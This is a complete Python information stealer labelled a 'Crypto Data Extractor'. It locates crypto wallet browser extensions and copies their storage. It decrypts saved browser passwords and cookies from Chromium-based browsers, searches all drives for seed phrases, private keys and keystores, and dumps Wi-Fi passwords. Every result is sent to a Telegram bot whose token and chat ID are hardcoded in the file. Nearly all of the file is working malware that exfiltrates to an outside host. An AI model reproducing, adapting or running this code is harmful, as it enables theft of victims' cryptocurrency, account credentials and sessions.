"""
Professional Crypto Data Extractor with Telegram Integration
Sends extracted data to Telegram bot with nice formatting
"""

import os, sys, json, sqlite3, base64, shutil, subprocess, time, random, requests
from pathlib import Path
from datetime import datetime
from io import BytesIO

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = "8575170512:AAEZTSin4RTJbXpVX74mkAXaxQFSJ33E9NI"
TELEGRAM_CHAT_ID = "8201214928"  # Your Telegram ID
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

class TelegramSender:
    def __init__(self):
        self.token = TELEGRAM_BOT_TOKEN
        self.chat_id = TELEGRAM_CHAT_ID
        self.api_url = TELEGRAM_API_URL
    
    def send_message(self, text, parse_mode="HTML"):
        """Send text message to Telegram"""
        try:
            url = f"{self.api_url}/sendMessage"
            data = {
                "chat_id": self.chat_id,
                "text": text,
                "parse_mode": parse_mode,
                "disable_web_page_preview": True
            }
            response = requests.post(url, json=data, timeout=10)
            return response.status_code == 200
        except Exception as e:
            return False
    
    def send_document(self, file_path, caption=""):
        """Send file to Telegram"""
        try:
            url = f"{self.api_url}/sendDocument"
            with open(file_path, 'rb') as f:
                files = {'document': f}
                data = {
                    'chat_id': self.chat_id,
                    'caption': caption
                }
                response = requests.post(url, files=files, data=data, timeout=30)
                return response.status_code == 200
        except Exception as e:
            return False
    
    def send_photo(self, file_path, caption=""):
        """Send photo to Telegram"""
        try:
            url = f"{self.api_url}/sendPhoto"
            with open(file_path, 'rb') as f:
                files = {'photo': f}
                data = {
                    'chat_id': self.chat_id,
                    'caption': caption
                }
                response = requests.post(url, files=files, data=data, timeout=30)
                return response.status_code == 200
        except Exception as e:
            return False

class CryptoExtractor:
    def __init__(self):
        self.output_dir = os.path.join(os.environ.get('TEMP', ''), f'tmp{random.randint(10000,99999)}')
        os.makedirs(self.output_dir, exist_ok=True)
        self.telegram = TelegramSender()
        self.data = {
            "timestamp": datetime.now().isoformat(),
            "crypto": {"wallets": [], "seeds": [], "keys": [], "extensions": []},
            "browsers": {},
            "system": {}
        }
        self._log("Initialized")
    
    def _log(self, msg):
        try:
            with open(os.path.join(self.output_dir, 'log.dat'), 'a', encoding='utf-8') as f:
                f.write(f"{datetime.now().isoformat()}|{msg}\n")
        except: pass
    
    def get_browser_paths(self):
        """Get all browser data paths"""
        paths = {}
        base = os.environ.get('LOCALAPPDATA', '')
        appdata = os.environ.get('APPDATA', '')
        
        browsers = {
            'chrome': [os.path.join(base, r'Google\Chrome\User Data'), os.path.join(appdata, r'Google\Chrome\User Data')],
            'edge': [os.path.join(base, r'Microsoft\Edge\User Data')],
            'brave': [os.path.join(base, r'BraveSoftware\Brave-Browser\User Data')],
            'opera': [os.path.join(base, r'Opera Software\Opera Stable')],
            'vivaldi': [os.path.join(base, r'Vivaldi\User Data')],
        }
        
        for name, path_list in browsers.items():
            for p in path_list:
                if os.path.exists(p):
                    paths[name] = p
                    break
        return paths
    
    def get_chrome_key(self, local_state_path):
        """Get Chrome encryption key"""
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                ls = json.load(f)
            ek = ls.get('os_crypt', {}).get('encrypted_key', '')
            if ek:
                ek = base64.b64decode(ek)[5:]
                try:
                    import win32crypt
                    return win32crypt.CryptUnprotectData(ek, None, None, None, 0)[1]
                except: pass
        except: pass
        return None
    
    def decrypt_value(self, enc_val, key=None):
        """Decrypt browser stored values"""
        try:
            import win32crypt
            return win32crypt.CryptUnprotectData(enc_val, None, None, None, 0)[1].decode('utf-8')
        except:
            if key:
                try:
                    from Crypto.Cipher import AES
                    iv = enc_val[3:15]
                    payload = enc_val[15:]
                    cipher = AES.new(key, AES.MODE_GCM, iv)
                    return cipher.decrypt(payload)[:-16].decode('utf-8')
                except: pass
        return None
    
    def extract_all_crypto_extensions(self, browser_path, browser_name):
        """Extract all crypto wallet extensions - COMPLETE LIST"""
        all_wallets = []
        
        # COMPLETE LIST OF ALL CRYPTO WALLETS
        crypto_extensions = {
            'metamask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
            'phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa',
            'trust': 'egjidjbpglichdcondbcbdnbeeppgdph',
            'coinbase': 'hnfanknocfeofbddgcijnmhnfnkdnaad',
            'exodus': 'aholpfdialjgjfhomihkjbmgjidlcdno',
            'atomic': 'dccgkkfkmbafjapdciinphppapdchfhh',
            'mathwallet': 'afbcbjpbpfadlkmhmclhkeeodmamcflc',
            'tronlink': 'ibnejdfjmmkpcnlpebklmnkoeoihofec',
            'binance': 'fhbohimaelbohpjbbldcngcnapndodjp',
            'okx': 'mcohilncbfahbmgdjkbpemcciiolgcge',
            'keplr': 'dmkamcknogkgcdfhhbddcghachkejeap',
            'solflare': 'bhghoamapcdpbohphigoooaddinpkbai',
            'rabby': 'acmacodkjbdgmoleebolmdjonilkdbch',
            'frame': 'hbljlbphjnlghnjjajibkfnmlfcglflj',
            'temple': 'ookjlbkiijinhpmnjffcofjonbfbgaoc',
            'yoroi': 'ffnbelfdoehohenjggjdkclllmacjbdi',
            'nami': 'glnpiemhiohmelhjhijhbidkolnmdlkd',
            'gero': 'ghgabhidcehdhjifalgafbgkhloaklkd',
            'flint': 'nfhnjljdfibcnahpjljadgcmaljpljnm',
        }
        
        ext_base = os.path.join(browser_path, 'Default', 'Extensions')
        if not os.path.exists(ext_base):
            return all_wallets
        
        for wallet_name, ext_id in crypto_extensions.items():
            ext_path = os.path.join(ext_base, ext_id)
            if os.path.exists(ext_path):
                self._log(f"Found {wallet_name} in {browser_name}")
                
                versions = [d for d in os.listdir(ext_path) if os.path.isdir(os.path.join(ext_path, d))]
                if versions:
                    latest_ver = sorted(versions, key=lambda x: [int(i) for i in x.split('.') if i.isdigit()])[-1]
                    ver_path = os.path.join(ext_path, latest_ver)
                    
                    storage_paths = [
                        os.path.join(browser_path, 'Default', 'Local Extension Settings', ext_id),
                        os.path.join(browser_path, 'Default', 'Sync Extension Settings', ext_id),
                        os.path.join(ver_path, 'storage'),
                    ]
                    
                    for storage_path in storage_paths:
                        if os.path.exists(storage_path):
                            for root, dirs, files in os.walk(storage_path):
                                for file in files:
                                    file_path = os.path.join(root, file)
                                    try:
                                        if file.endswith(('.ldb', '.log', '.json')):
                                            with open(file_path, 'rb') as f:
                                                content = f.read()
                                                text = content.decode('utf-8', errors='ignore')
                                                
                                                if any(kw in text.lower() for kw in ['seed', 'mnemonic', 'private', 'key', 'wallet', 'phrase', 'recovery']):
                                                    all_wallets.append({
                                                        "wallet": wallet_name,
                                                        "browser": browser_name,
                                                        "file": file_path,
                                                        "data": text[:5000],
                                                        "size": len(content)
                                                    })
                                    except: continue
        
        return all_wallets
    
    def extract_browser_passwords(self, browser_path, browser_name):
        """Extract browser passwords"""
        passwords = []
        try:
            login_db = os.path.join(browser_path, 'Default', 'Login Data')
            local_state = os.path.join(browser_path, 'Local State')
            
            if not os.path.exists(login_db):
                return passwords
            
            key = self.get_chrome_key(local_state)
            temp_db = os.path.join(self.output_dir, f'{browser_name}_login.db')
            
            try:
                shutil.copy2(login_db, temp_db)
            except:
                return passwords
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for url, user, enc_pwd in cursor.fetchall():
                if enc_pwd:
                    pwd = self.decrypt_value(enc_pwd, key)
                    if pwd:
                        passwords.append({"url": url, "username": user, "password": pwd})
            
            conn.close()
            try:
                os.remove(temp_db)
            except: pass
            
        except Exception as e:
            self._log(f"Error: {e}")
        
        return passwords
    
    def extract_browser_cookies(self, browser_path, browser_name):
        """Extract browser cookies"""
        cookies = []
        try:
            cookie_db = os.path.join(browser_path, 'Default', 'Cookies')
            local_state = os.path.join(browser_path, 'Local State')
            
            if not os.path.exists(cookie_db):
                return cookies
            
            key = self.get_chrome_key(local_state)
            temp_db = os.path.join(self.output_dir, f'{browser_name}_cookies.db')
            
            try:
                shutil.copy2(cookie_db, temp_db)
            except:
                return cookies
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, value, encrypted_value FROM cookies LIMIT 5000")
            
            for host, name, val, enc_val in cursor.fetchall():
                cookie_val = self.decrypt_value(enc_val, key) if enc_val else val
                if cookie_val:
                    cookies.append({"host": host, "name": name, "value": cookie_val})
            
            conn.close()
            try:
                os.remove(temp_db)
            except: pass
            
        except: pass
        
        return cookies
    
    def search_seed_phrases(self):
        """Comprehensive seed phrase search"""
        self._log("Searching for seed phrases...")
        seeds = []
        
        # Get all drives for FULL PC SCAN
        drives = []
        try:
            result = subprocess.run(['wmic', 'logicaldisk', 'get', 'name'], capture_output=True, text=True)
            drives = [line.strip() + '\\' for line in result.stdout.split('\n') if line.strip() and ':' in line]
        except:
            drives = ['C:\\']
        
        user_paths = [
            os.environ.get('APPDATA', ''),
            os.environ.get('LOCALAPPDATA', ''),
            os.path.join(os.environ.get('USERPROFILE', ''), 'Documents'),
            os.path.join(os.environ.get('USERPROFILE', ''), 'Desktop'),
            os.path.join(os.environ.get('USERPROFILE', ''), 'Downloads'),
        ]
        
        search_paths = drives + user_paths
        
        wallet_dirs = [
            'MetaMask', 'Trust Wallet', 'Exodus', 'Atomic Wallet', 'Electrum',
            'MyEtherWallet', 'Phantom', 'Solflare', 'Coinbase', 'Binance',
            'Ledger', 'Trezor', 'KeepKey', 'Jaxx', 'Jaxx Liberty',
        ]
        
        seed_patterns = ['seed', 'mnemonic', 'wallet', 'backup', 'recovery', 'private', 'key', 'phrase', 'keystore', 'passphrase']
        crypto_extensions = ['.txt', '.json', '.dat', '.key', '.wallet', '.keystore', '.db', '.sqlite', '.ldb']
        
        self.telegram.send_message("🔍 <b>Scanning entire PC for crypto data...</b>")
        
        for base_path in search_paths:
            if not os.path.exists(base_path):
                continue
            
            is_drive_root = len(base_path) == 3 and base_path.endswith(':\\')
            
            try:
                for root, dirs, files in os.walk(base_path):
                    if not is_drive_root:
                        dirs[:] = [d for d in dirs if d not in ['$Recycle.Bin', 'System Volume Information', 'Windows', 'Program Files', 'Program Files (x86)']]
                    
                    if is_drive_root:
                        depth = root[len(base_path):].count(os.sep) if base_path else 0
                        if depth > 3:
                            dirs[:] = []
                            continue
                    
                    for file in files:
                        file_lower = file.lower()
                        file_path = os.path.join(root, file)
                        
                        if any(p in file_lower for p in seed_patterns) or any(file.endswith(ext) for ext in crypto_extensions):
                            try:
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read(50000)
                                    words = content.split()
                                    
                                    if 12 <= len(words) <= 24:
                                        common = ['abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse']
                                        if any(w.lower() in common for w in words[:10]):
                                            seeds.append({
                                                "file": file_path,
                                                "content": content[:5000],
                                                "word_count": len(words),
                                                "type": "seed_phrase"
                                            })
                                    
                                    elif len(content.strip()) == 64 or (content.strip().startswith('0x') and len(content.strip()) == 66):
                                        seeds.append({
                                            "file": file_path,
                                            "content": content.strip(),
                                            "type": "private_key"
                                        })
                                    
                                    elif content.strip().startswith('{') and ('crypto' in content.lower() or 'keystore' in content.lower()):
                                        try:
                                            json_data = json.loads(content)
                                            if 'crypto' in json_data or 'keystore' in json_data:
                                                seeds.append({
                                                    "file": file_path,
                                                    "content": content[:5000],
                                                    "type": "keystore"
                                                })
                                        except: pass
                            except: continue
            except: continue
        
        return seeds
    
    def extract_wifi_passwords(self):
        """Extract WiFi passwords"""
        wifi = []
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
                                  capture_output=True, text=True, encoding='utf-8', errors='ignore')
            profiles = [line.split(':')[1].strip() for line in result.stdout.split('\n') 
                       if 'Profile' in line and ':' in line]
            
            for prof in profiles:
                try:
                    res = subprocess.run(['netsh', 'wlan', 'show', 'profile', f'name={prof}', 'key=clear'],
                                        capture_output=True, text=True, encoding='utf-8', errors='ignore')
                    for line in res.stdout.split('\n'):
                        if 'Key Content' in line and ':' in line:
                            pwd = line.split(':')[1].strip()
                            if pwd:
                                wifi.append({"ssid": prof, "password": pwd})
                            break
                except: continue
        except: pass
        
        return wifi
    
    def format_telegram_message(self):
        """Format data for Telegram with nice UI"""
        msg = "🔐 <b>CRYPTO DATA EXTRACTION REPORT</b>\n"
        msg += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        
        # Crypto Wallets
        wallet_count = len(self.data['crypto']['wallets'])
        msg += f"💰 <b>CRYPTO WALLETS:</b> {wallet_count}\n"
        
        if wallet_count > 0:
            wallets_by_name = {}
            for wallet in self.data['crypto']['wallets']:
                name = wallet.get('wallet', 'unknown')
                if name not in wallets_by_name:
                    wallets_by_name[name] = []
                wallets_by_name[name].append(wallet)
            
            for name, wallets in wallets_by_name.items():
                msg += f"  • <b>{name.upper()}</b>: {len(wallets)} entries\n"
        
        msg += "\n"
        
        # Seed Phrases
        seed_count = len(self.data['crypto']['seeds'])
        msg += f"🌱 <b>SEED PHRASES:</b> {seed_count}\n"
        if seed_count > 0:
            for i, seed in enumerate(self.data['crypto']['seeds'][:5], 1):  # First 5
                seed_type = seed.get('type', 'unknown')
                content = seed.get('content', '')[:100]
                msg += f"  {i}. <code>{seed_type}</code>\n"
                msg += f"     {content}...\n"
            if seed_count > 5:
                msg += f"     ... and {seed_count - 5} more\n"
        
        msg += "\n"
        
        # Browser Passwords
        total_passwords = sum(len(b.get('passwords', [])) for b in self.data['browsers'].values())
        msg += f"🔑 <b>BROWSER PASSWORDS:</b> {total_passwords}\n"
        for browser, data in self.data['browsers'].items():
            pwd_count = len(data.get('passwords', []))
            if pwd_count > 0:
                msg += f"  • <b>{browser.upper()}</b>: {pwd_count} passwords\n"
        
        msg += "\n"
        
        # Cookies
        total_cookies = sum(len(b.get('cookies', [])) for b in self.data['browsers'].values())
        msg += f"🍪 <b>COOKIES:</b> {total_cookies}\n"
        
        msg += "\n"
        
        # WiFi
        wifi_count = len(self.data['system'].get('wifi', []))
        msg += f"📶 <b>WI-FI PASSWORDS:</b> {wifi_count}\n"
        
        msg += "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        msg += f"⏰ <i>Extracted: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</i>"
        
        return msg
    
    def send_to_telegram(self):
        """Send all data to Telegram"""
        try:
            # Send summary message
            summary = self.format_telegram_message()
            self.telegram.send_message(summary)
            time.sleep(1)
            
            # Send detailed crypto data
            if self.data['crypto']['wallets']:
                crypto_text = "💰 <b>DETAILED CRYPTO WALLET DATA</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                for wallet in self.data['crypto']['wallets'][:10]:  # First 10
                    crypto_text += f"<b>{wallet.get('wallet', 'unknown').upper()}</b> ({wallet.get('browser', 'unknown')})\n"
                    crypto_text += f"<code>{wallet.get('data', '')[:500]}</code>\n\n"
                    if len(crypto_text) > 3500:  # Telegram limit
                        self.telegram.send_message(crypto_text)
                        crypto_text = ""
                        time.sleep(1)
                if crypto_text:
                    self.telegram.send_message(crypto_text)
                time.sleep(1)
            
            # Send seed phrases
            if self.data['crypto']['seeds']:
                seeds_text = "🌱 <b>SEED PHRASES & PRIVATE KEYS</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                for seed in self.data['crypto']['seeds']:
                    seeds_text += f"<b>Type:</b> {seed.get('type', 'unknown')}\n"
                    seeds_text += f"<b>File:</b> <code>{seed.get('file', '')}</code>\n"
                    seeds_text += f"<b>Content:</b>\n<code>{seed.get('content', '')[:1000]}</code>\n\n"
                    if len(seeds_text) > 3500:
                        self.telegram.send_message(seeds_text)
                        seeds_text = ""
                        time.sleep(1)
                if seeds_text:
                    self.telegram.send_message(seeds_text)
                time.sleep(1)
            
            # Send passwords (first 20)
            all_passwords = []
            for browser, data in self.data['browsers'].items():
                for pwd in data.get('passwords', [])[:20]:
                    all_passwords.append((browser, pwd))
            
            if all_passwords:
                pwd_text = "🔑 <b>BROWSER PASSWORDS</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                for browser, pwd in all_passwords:
                    pwd_text += f"<b>{browser.upper()}</b>\n"
                    pwd_text += f"URL: <code>{pwd['url']}</code>\n"
                    pwd_text += f"User: <code>{pwd['username']}</code>\n"
                    pwd_text += f"Pass: <code>{pwd['password']}</code>\n\n"
                    if len(pwd_text) > 3500:
                        self.telegram.send_message(pwd_text)
                        pwd_text = ""
                        time.sleep(1)
                if pwd_text:
                    self.telegram.send_message(pwd_text)
            
            # Send JSON file if small enough
            json_file = os.path.join(self.output_dir, f"data_{int(time.time())}.json")
            with open(json_file, 'w', encoding='utf-8') as f:
                json.dump(self.data, f, indent=2, ensure_ascii=False)
            
            # Try to send file (if under 50MB)
            if os.path.getsize(json_file) < 50 * 1024 * 1024:
                self.telegram.send_document(json_file, "📄 Complete JSON Data")
            
        except Exception as e:
            self._log(f"Telegram error: {e}")
    
    def extract_all(self):
        """Extract everything and send to Telegram"""
        self._log("Starting extraction...")
        
        # Send start notification
        self.telegram.send_message("🚀 <b>Extraction Started</b>\n\nBeginning data extraction...")
        
        # Extract from all browsers
        browser_paths = self.get_browser_paths()
        
        for browser_name, browser_path in browser_paths.items():
            self._log(f"Processing {browser_name}")
            
            crypto_wallets = self.extract_all_crypto_extensions(browser_path, browser_name)
            self.data["crypto"]["wallets"].extend(crypto_wallets)
            
            self.data["browsers"][browser_name] = {
                "passwords": self.extract_browser_passwords(browser_path, browser_name),
                "cookies": self.extract_browser_cookies(browser_path, browser_name),
            }
        
        self.data["crypto"]["seeds"] = self.search_seed_phrases()
        self.data["system"]["wifi"] = self.extract_wifi_passwords()
        
        # Send to Telegram
        self.send_to_telegram()
        
        return self.data

if __name__ == "__main__":
    extractor = CryptoExtractor()
    extractor.extract_all()

